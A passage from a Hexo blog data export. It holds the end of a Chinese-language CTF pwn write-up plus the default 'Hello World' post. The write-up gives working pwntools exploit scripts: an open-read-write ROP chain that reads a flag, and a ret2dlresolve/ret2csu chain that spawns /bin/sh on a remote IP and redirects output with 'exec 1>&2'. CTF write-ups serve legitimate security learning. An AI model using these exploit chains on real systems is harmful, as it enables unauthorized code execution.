class=\"line\">payload=b&#x27;a&#x27;*0x78+p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag_name)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rsi)+p64(0)+p64(syscall_ret)+p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(pop_rax)+p64(1)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(flag_name+0x20)+p64(pop_rdx)+p64(0x30)+p64(syscall_ret)+p64(0x401270)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.interactive(0)</span><br><span class=\"line\"> </span><br><span class=\"line\"># 0x000000000040135c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040135e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401360 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401362 : pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040135b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040135f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040119d : pop rbp ; ret</span><br><span class=\"line\"># 0x0000000000401363 : pop rdi ; ret</span><br><span class=\"line\"># 0x0000000000401361 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040135d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040101a : ret</span><br><span class=\"line\"># 0x000000000040127e : ret 0x14</span><br><span class=\"line\"># 0x00000000004012e7 : ret 0x200</span><br><span class=\"line\"> </span><br><span class=\"line\"># 0x00000000004012ba : ret 0x4c</span><br><span class=\"line\"># 0x000000000040129c : ret 0x50</span><br><span class=\"line\"># offset in libc</span><br><span class=\"line\"># 0x0000000000036174 : pop rax ; ret</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"close\"><a href=\"#close\" class=\"headerlink\" title=\"close\"></a>close</h3><p>Q:你leak不了一点！hacker！！<br>A:？？？？？？<br>依旧是栈溢出，这次没有沙箱了。但是把标准输出关闭了。这意味着我们需要把标准输出重定向才能获得flag<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3dis1.png\"><br>既然我们在get shell之前没办法获得任何输出，那么我们必须采用一种不依赖于泄露东西的方法。<br>于是毋庸置疑，关于泄露libc地址的方法直接一票否决了。<br>于是考虑使用ret2dlresolve来调用shell。<br>这里使用生成的payload<br>原本是想用system(“&#x2F;bin&#x2F;sh”)的，但是发现system好像有些神秘问题导致显示：<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3problem.png\"><br>于是采用execve(“&#x2F;bin&#x2F;sh”,0,0)来获取shell<br>但是由于没有直接pop rdx的gadget，我们使用csu来进行rdx的修改。（注意这里面的call和判断,标记起来了）：<br><img src=\"https://zcoi.github.io/blogs/CTF/monthgame2310/3csu.png\"><br>所以我们先把想要的rdx的值pop到r14里面，然后返回到0x4012300那里，把r14赋给rdx。这里绕过判断就是让rbx和rbp值相等。这里多调试几下就OK了<br>之后就get到shell了。这时候我们要把标准输出重定向到标准错误里面，即exec 1&gt;&amp;2<br>hint:网上关于标准输出被关闭的情况，有教程：exec 1&gt;&amp;0。但是似乎ubuntu 20不太好使。 可以选择把输出重定向给标准错误（2）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class=\"line\">context.binary = elf = ELF(&quot;./pwn&quot;)</span><br><span class=\"line\">rop = ROP(context.binary)</span><br><span class=\"line\">dlresolve = Ret2dlresolvePayload(elf,symbol=&quot;execve&quot;,args=[&quot;/bin/sh&quot;,0])</span><br><span class=\"line\">rop.read(0,dlresolve.data_addr)</span><br><span class=\"line\">rop.ret2dlresolve(dlresolve)</span><br><span class=\"line\">raw_rop = rop.chain()</span><br><span class=\"line\"># io = process(&quot;./pwn&quot;)</span><br><span class=\"line\"># io=process([&#x27;./ld-linux-x86-64.so.2&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span><br><span class=\"line\"># io=process([&#x27;./ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;&#125;)</span><br><span class=\"line\">io=remote(&#x27;8.130.110.158&#x27;,7001)</span><br><span class=\"line\"># gdb.attach(io)</span><br><span class=\"line\">payload0 = flat(&#123;0x98:raw_rop&#125;)</span><br><span class=\"line\">io.sendlineafter(&#x27;name&#x27;,&quot;fuck&quot;)</span><br><span class=\"line\">payload1=b&#x27;a&#x27;*0x90+p64(0x404e90)+p64(0x40127c)</span><br><span class=\"line\">io.sendlineafter(&#x27;response&#x27;,payload1)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">io.sendline(dlresolve.payload.ljust(0x90,b&#x27;\\x00&#x27;)+p64(0x404ff0)+p64(0x401323)+p64(0x402018)+p64(0x40131a)+p64(0)+p64(1)+p64(0x402018)+p64(0)+p64(0)+p64(elf.got[&#x27;alarm&#x27;])+p64(0x401300)+p64(0x404e90)+p64(0x404ff0)+p64(0x401230)+p64(0)+p64(0)+p64(0)+raw_rop[40:])</span><br><span class=\"line\"># pause()</span><br><span class=\"line\"># io.sendline(dlresolve.payload)</span><br><span class=\"line\"># io=remote(&#x27;8.130.110.158&#x27;,7001)</span><br><span class=\"line\">io.sendline(b&quot;exec 1&gt;&amp;2&quot;)</span><br><span class=\"line\">io.sendline(b&quot;ls&quot;)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"> </span><br><span class=\"line\"># 0x404e90</span><br><span class=\"line\"># 0x000000000040131c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040131e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401320 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x0000000000401322 : pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040131b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040131f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x00000000004011bd : pop rbp ; ret</span><br><span class=\"line\"># 0x0000000000401323 : pop rdi ; ret</span><br><span class=\"line\"># 0x0000000000401321 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040131d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"># 0x000000000040101a : ret</span><br></pre></td></tr></table></figure>\n"},{"title":"Hello World","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2023-11-04T07:03:08.914Z","updated":"2023-11-04T07:03:08.914Z","comments":1,"layout":"post","photos":[],"_id":"clojpbdii0001z0aih8rgh46k","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clojpbdic0000z0aied7jc2c5","category_id":"clojpbdik0002z0ai9tgjhwtr","_id":"clojpbdim0005z0aiamvpf434"}],"PostTag":[{"post_id":"clojpbdic0000z0aied7jc2c5","tag_id":"clojpbdil0003z0aiep8zee6l","_id":"clojpbdim0004z0ai7kr5gjx2"}],"Tag":[{"name":"Pwn","_id":"clojpbdil0003z0aiep8zee6l"}]}}